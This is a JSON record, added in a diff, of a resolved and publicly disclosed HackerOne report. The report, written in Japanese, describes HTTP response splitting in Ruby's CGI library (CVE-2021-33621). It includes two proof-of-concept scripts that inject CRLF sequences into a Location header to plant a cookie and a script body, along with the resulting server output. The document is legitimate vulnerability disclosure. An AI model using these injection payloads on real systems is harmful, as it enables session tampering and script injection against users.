@@ -1,0 +1,136 @@
+{
+  "id": 1204695,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjA0Njk1",
+  "url": "https://hackerone.com/reports/1204695",
+  "title": "RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-05-21T01:10:02.661Z",
+  "submitted_at": "2021-05-21T01:10:02.734Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "htokumaru",
+    "url": "/htokumaru",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/sjwFRaTog4dFsHBYahCn8L8c/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-33621",
+    "CVE-2019-16254"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-11-24T01:46:39.911Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-11-24T01:46:39.817Z",
+  "team_member_agreed_on_going_public_at": "2022-11-23T23:23:01.074Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "PoC1:\n```\n#!/usr/bin/env ruby\nrequire 'cgi'\ncgi = CGI.new\nurl = \"http://example.jp\\r\\nSet-Cookie: foo=bar;\"     # External Parameter\nprint cgi.header({'status' => '302 Found', 'Location' => url})\n```\n\nActual Result1:\n```\n$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru\nHTTP/1.1 302 Found\nDate: Fri, 21 May 2021 00:46:33 GMT\nServer: Apache/2.2.31 (Unix)\nSet-Cookie: foo=bar;\nLocation: http://example.jp\nContent-Length: 0\nContent-Type: text/html\n\n```\n\nこのケースでは不正なクッキーが注入される。\n\n\nPoC2:\n```\n#!/usr/bin/env ruby\nrequire 'cgi'\ncgi = CGI.new\nurl = \"http://example.jp\\r\\nStatus: 500\\r\\n\\r\\n<script>alert(1)</script>\"  # External Parameter\nprint cgi.header({'status' => '302 Found', 'Location' => url})\n```\n\nActual Result2:\n```\n$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru\nHTTP/1.1 500 Internal Server Error\nDate: Fri, 21 May 2021 00:49:44 GMT\nServer: Apache/2.2.31 (Unix)\nLocation: http://example.jp\nConnection: close\nTransfer-Encoding: chunked\nContent-Type: text/html\n\n<script>alert(1)</script>\n\n```\n\nこのケースでは500 Internal Server Errorのため、Locationヘッダは無視され、JavaScriptが実行される。\n\n## Impact\n\n意図しないHTTPレスポンスヘッダやHTTPレスポンスボディを外部から注入できます。\n単純なHTTPヘッダインジェクションでは、クッキーのインジェクションやリダイレクト等が主な影響となりますが、このケースでは、レスポンスボディが注入できるため、不正なJavaScript実行に及ぶため、影響が大きいと考えます。\n\n他の言語の場合、PHPのheader関数は \"\\r\"  \"\\n\"   \"\\r\\n\"   等をすべてエラーにするため、上記の攻撃はできません。\n\n過去のWEBrickやPumaにも類似の脆弱性がありましたが、これらは単独のキャリッジリターン \"\\r\" による攻撃しかできず、リバースプロキシとしてNginxがあれば、Nginx側にてエラーになります。したがって、現実的な危険性はほとんどないと考えます。\n\nhttps://www.ruby-lang.org/en/news/2019/10/01/http-response-splitting-in-webrick-cve-2019-16254/\nhttps://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v\n\n一方、今回報告した問題は、CGIの仕様上ウェブサーバーやリバースプロキシ側でエラーにすることはできないため、影響が現実的です。",
+  "weakness": {
+    "id": 1,
+    "name": "HTTP Response Splitting"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2022-12-23T23:23:01.199Z",
+  "allow_singular_disclosure_after": -106501553.54478131,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "zy9ard3",
+    "mr-k0anti",
+    "7odamoo",
+    "shivammusic",
+    "retaherx",
+    "ittafunahashi",
+    "pofb",
+    "capta1n_l3vi"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 28212,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/ruby/ruby",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
